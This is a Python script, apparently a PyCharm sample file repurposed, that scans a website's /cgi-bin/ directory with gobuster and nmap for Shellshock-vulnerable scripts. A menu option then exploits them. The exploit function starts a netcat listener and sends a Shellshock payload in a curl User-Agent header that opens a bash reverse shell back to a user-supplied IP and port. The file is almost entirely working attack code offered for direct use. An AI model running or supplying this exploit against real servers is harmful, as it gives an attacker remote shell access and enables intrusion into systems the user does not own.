# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import requests
import subprocess
from urllib.parse import urlparse
import os

directory = '/cgi-bin/'
extensions = ["pl", "sh"]


def detect_shellshock(website_url, wordlists):
    print("Scanning...")
    try:
        resp = requests.get(website_url + directory)
        status = resp.status_code
        if status == 200 or status == 403 or status == 301 or status == 302:
            print("URL might be vulnerable to shellshock")

            command = ["gobuster", "-u", website_url + directory, "-x", ",".join(extensions), "-w", wordlists, "-q",
                       "-s",
                       "200,301,302", "-n"]
            response = subprocess.check_output(command)
            vulnerable_urls = []
            for line in response.splitlines():
                file_path = line.decode("utf-8")
                if any(extension in file_path for extension in extensions):
                    domain = urlparse(website_url).netloc
                    command = ["nmap", "--script", "http-shellshock", "--script-args",
                               "uri=" + directory + file_path.strip("/"), "-p", "80,443", domain]
                    try:
                        nmap_result = subprocess.check_output(command)
                    except:
                        continue

                    if "VULNERABLE" in nmap_result.decode("utf-8"):
                        vuln_url = website_url + directory + file_path.strip("/")
                        vulnerable_urls.append(vuln_url)

            print("Vulnerable URL(s): ")
            for url in vulnerable_urls:
                print(url)

        else:
            print("URL is not vulnerable to shellshock")
    except Exception as e:
        print(e)


def exploit_shellshock(listen_port, listen_ip, vulnerable_url):
    try:
        subprocess.Popen(["gnome-terminal", "--", "nc", "-lvp", str(listen_port)])
        payload = "() { :; }; /bin/bash -i >& /dev/tcp/"+listen_ip+f"/{listen_port} 0>&1"
        print(payload)
        print(payload)
        curl_cmd = f"curl -H 'User-Agent: {payload}' {vulnerable_url}"

        # Execute the curl command and capture the output
        output = os.popen(curl_cmd).read()

    except Exception as e:
        print(e)


def banner():
    print("Shellshock Detection and Exploitation script")
    print("[1] Detect the Shellshock")
    print("[2] Exploit Shellshock")
    menu_input = int(input("Select option from the above (1/2):"))
    if menu_input == 1:
        web_url = input("Please Enter the website URL (http/https): ")
        wordlists = input("Enter the path to the wordlists to use: ")
        detect_shellshock(web_url, wordlists)
    else:
        web_url = input("Please Enter the vulnerable URL (http/https): ")
        ip = input("Enter Local listening IP address: ")
        port = input("Enter Listening port: ")
        exploit_shellshock(port,ip,web_url)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    banner()
